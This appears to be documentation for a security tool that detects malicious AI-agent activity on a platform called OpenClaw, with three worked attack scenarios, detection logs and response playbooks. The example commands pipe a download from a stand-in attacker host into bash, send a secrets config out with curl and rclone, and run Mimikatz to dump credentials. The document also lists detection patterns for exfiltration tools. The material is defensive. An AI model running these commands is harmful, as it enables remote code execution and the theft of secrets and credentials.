# Example Attack Scenarios

Real examples of attacks detected by secopsai rules.

## Example 1: Dangerous Exec (RULE-101)

### Attack Scenario

Agent downloads and executes a script from an untrusted source without verification.

**What Happened:**

```bash
# Attacker downloads script from suspicious domain
curl https://attacker-c2.example.com/setup.sh | bash

# The pipe operator (|) passes script directly to bash
# No review of script contents before execution
```

**Why It's Dangerous:**

- ✗ Arbitrary code execution from untrusted source
- ✗ No integrity verification
- ✗ No review of script contents
- ✗ Attacker controls execution context

**Detection Details:**

```json
{
  "event_id": "evt-042",
  "timestamp": "2026-03-15T14:23:45Z",
  "rule_id": "RULE-101",
  "rule_name": "Dangerous Exec",
  "severity": "CRITICAL",
  "confidence": 1.0,
  "pattern_matched": "curl.*|.*bash",
  "surface": "exec",
  "command": "curl https://attacker-c2.example.com/setup.sh | bash",
  "detection_time_ms": 0.3
}
```

**What to Do:**

1. **Immediate Action** (0-1 minute)
   - Interrupt execution if still running
   - Review curl destination (attacker-c2.example.com)
   - Check if agent is still responsive

2. **Investigation** (1-5 minutes)
   - Review OpenClaw audit log for lateral movement
   - Check what commands were executed after this event
   - Identify who initiated the action

3. **Containment** (5-15 minutes)
   - Isolate the agent if compromise confirmed
   - Revoke any credentials accessed
   - Scan for persistence mechanisms

4. **Remediation** (ongoing)
   - Update agent capability restrictions
   - Require approval for external script execution
   - Log all curl/wget activities

**Prevention:**

- ✓ Only download from trusted sources
- ✓ Verify script hash before execution
- ✓ Use package managers (npm, pip, git) instead
- ✓ Require approval workflows for shell scripts
- ✓ Scan downloads with antivirus

---

## Example 2: Data Exfiltration (RULE-109)

### Attack Scenario

Attacker stages a sensitive configuration file and uploads it to attacker-controlled server.

**What Happened:**

```bash
# Attacker discovers sensitive OpenClaw config
# Stages it as a tar archive
tar czf openclaw-backup.tar.gz ~/.openclaw/openclaw.json

# Uploads archive to attacker server via curl form upload
curl -F "data=@openclaw-backup.tar.gz" https://attacker-storage.example.com/upload

# Or uses rclone to sync to cloud storage
rclone copy ~/.openclaw/openclaw.json attacker-bucket:/stolen-configs/
```

**Why It's Dangerous:**

- ✗ Authentication secrets exposed (API tokens, keys)
- ✗ Configuration could reveal system architecture
- ✗ Credentials can be used for lateral movement
- ✗ Attackers gain persistent access to other systems

**Detection Details:**

```json
{
  "event_id": "evt-156",
  "timestamp": "2026-03-15T14:45:12Z",
  "rule_id": "RULE-109",
  "rule_name": "Data Exfiltration",
  "severity": "CRITICAL",
  "confidence": 1.0,
  "pattern_matched": "curl.*-F.*@.*|rclone.*copy",
  "surface": "exec",
  "command": "curl -F 'data=@openclaw-backup.tar.gz' https://attacker-storage.example.com/upload",
  "detection_time_ms": 0.2
}
```

**Exfiltration Methods Detected:**

- `curl -F @file` — HTTP POST form upload
- `wget --post-file` — HTTP post upload
- `rclone copy|sync` — Cloud storage sync
- `rsync` — Remote rsync transfer
- `nc` — netcat bidirectional transfer
- `tar|zip && curl` — Archive chains
- Keywords: "exfil", "exfiltration"

**What to Do:**

1. **Immediate Action** (0-1 minute)
   - Block outbound connections to attacker-storage.example.com
   - Interrupt agent if exfiltration in progress
   - Preserve logs before log deletion

2. **Investigation** (1-10 minutes)
   - Identify what was exfiltrated (file hash, size, name)
   - Trace where data went (attacker-storage.example.com)
   - Check when exfiltration started
   - Review surrounding events for reconnaissance

3. **Data Loss Assessment** (10-60 minutes)
   - Determine scope of leaked data
   - Identify sensitive fields in openclaw.json
   - Assess risk of credentials being used
   - Contact legal/compliance if required

4. **Containment** (within 1 hour)
   - Revoke all credentials in exposed config
   - Reset API tokens and authentication keys
   - Block attacker infrastructure at network level
   - Rotate SSH keys and authentication

5. **Remediation** (ongoing)
   - Implement DLP (Data Loss Prevention) rules
   - Monitor for use of exposed credentials
   - Require approval for file uploads
   - Encrypt sensitive config at rest

**Prevention:**

- ✓ Restrict outbound connections to approved destinations
- ✓ Encrypt sensitive configuration data
- ✓ Monitor and alert on large file transfers
- ✓ Require approval for curl/rclone/rsync usage
- ✓ Store secrets in secure vault, not config files

---

## Example 3: Malware Presence (RULE-110)

### Attack Scenario

Attacker uses Mimikatz PowerShell module to extract credentials from agent system.

**What Happened:**

```powershell
# Attacker uploads Invoke-Mimikatz.ps1 script
curl -O https://attacker-c2/Invoke-Mimikatz.ps1

# Executes Mimikatz via PowerShell to extract credentials
powershell -NoProfile -ExecutionPolicy Bypass -Command "
  . .\Invoke-Mimikatz.ps1
  Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
"

# Extracts cached credentials from memory
# LSASS process memory dumped
# Plaintext passwords harvested
```

**Why It's Dangerous:**

- ✗ Credential extraction from running system
- ✗ LSASS process memory access (admin-level)
- ✗ Plaintext password extraction
- ✗ Can be used for lateral movement to other systems
- ✗ Persistent breach if credentials are strong

**Detection Details:**

```json
{
  "event_id": "evt-789",
  "timestamp": "2026-03-15T15:30:22Z",
  "rule_id": "RULE-110",
  "rule_name": "Malware Presence",
  "severity": "CRITICAL",
  "confidence": 1.0,
  "pattern_matched": "Invoke-Mimikatz|sekurlsa::logonpasswords",
  "surface": "exec",
  "command": "powershell -Command ... Invoke-Mimikatz ... sekurlsa::logonpasswords",
  "detection_time_ms": 0.1
}
```

**Malware Signatures Detected:**

- **Mimikatz** — Credential dumping tool
- **Cobalt Strike** — C2 framework
- **Metasploit** — Exploitation framework
- **xmrig** — Cryptocurrency miner
- **Ransomware families** — Encryption/extortion
- **RATs** — Remote Access Trojans (njrat, quasar, darkcomet, remcos)
- **PowerShell patterns** — Invoke-Mimikatz, sekurlsa::logonpasswords

**What to Do:**

1. **IMMEDIATE Action** (0-5 minutes)
   - **Air-gap the system** (disconnect from network)
   - Preserve full memory dump (for forensics)
   - Do NOT restart (could clear memory evidence)
   - Alert SOC and incident response immediately

2. **Forensic Preservation** (5-30 minutes)
   - Capture full system memory dump
   - Preserve hard drive image
   - Export OpenClaw audit logs
   - Preserve Windows Event logs
   - Document timeline of events

3. **Scope Assessment** (30-60 minutes)
   - Determine malware variant (Mimikatz version, etc)
   - Identify command and control server
   - List extracted credentials
   - Check for lateral movement attempts
   - Review for data exfiltration

4. **Containment** (within 1 hour)
   - Revoke all credentials that may be exposed
   - Reset passwords for all accounts
   - Block C2 infrastructure at perimeter
   - Isolate other potentially compromised systems
   - Prepare for rebuild/reimaging

5. **Eradication** (ongoing)
   - Remove malware from system (if recoverable)
   - Or rebuild system from trusted backup
   - Update all credentials to new values
   - Patch vulnerabilities that allowed access
   - Deploy EDR/antivirus detection

6. **Recovery** (ongoing)
   - Monitor for credential reuse
   - Hunt for lateral movement
   - Forensic analysis of incident
   - Implement additional controls

**Prevention:**

- ✓ Restrict PowerShell execution (AppLocker)
- ✓ Block PowerShell scripts without digital signature
- ✓ Monitor LSASS memory access
- ✓ Require approval for credential access tools
- ✓ Deploy EDR (Endpoint Detection & Response)
- ✓ Keep systems patched and updated
- ✓ Restrict admin access
- ✓ Enable credential guard (Windows)

---

## How These Attacks Were Detected

### Detection Pipeline

```
1. Event Generated
   ↓
2. Normalized to openclaw-audit-v1 schema
   ↓
3. Matched against 12 rules in parallel
   ↓
4. RULE-101/RULE-109/RULE-110 trigger
   ↓
5. Detection logged with confidence 1.0
   ↓
6. Findings report generated
   ↓
7. Severity: CRITICAL
   ↓
8. Remediation guidance provided
```

### Why F1 1.0?

These attacks were:

- ✓ Clearly malicious (high confidence patterns)
- ✓ Unique signatures (not benign behavior)
- ✓ Well-tested rules (no false positives)
- ✓ Real attack scenarios (realistic patterns)
- ✓ Reproducible detections (deterministic)

---

## More Examples

These three examples represent the breadth of detection:

- **RULE-101**: Command execution attacks
- **RULE-109**: Data loss/exfiltration attacks
- **RULE-110**: Malware/adversary tools

See **[Rules Registry](rules-registry.md)** for:

- RULE-102: Sensitive Config Changes
- RULE-103: Skill Source Drift (supply chain)
- RULE-104: Policy Denial Churn (brute force)
- RULE-105: Tool Burst (reconnaissance)
- RULE-106: Pairing Churn (auth bypass)
- RULE-107: Subagent Fanout (lateral movement)
- RULE-108: Restart Loop (sabotage)

---

**Next:** [Rules Registry](rules-registry.md) for complete rule reference, or [Deployment Guide](deployment-guide.md) to put into production.
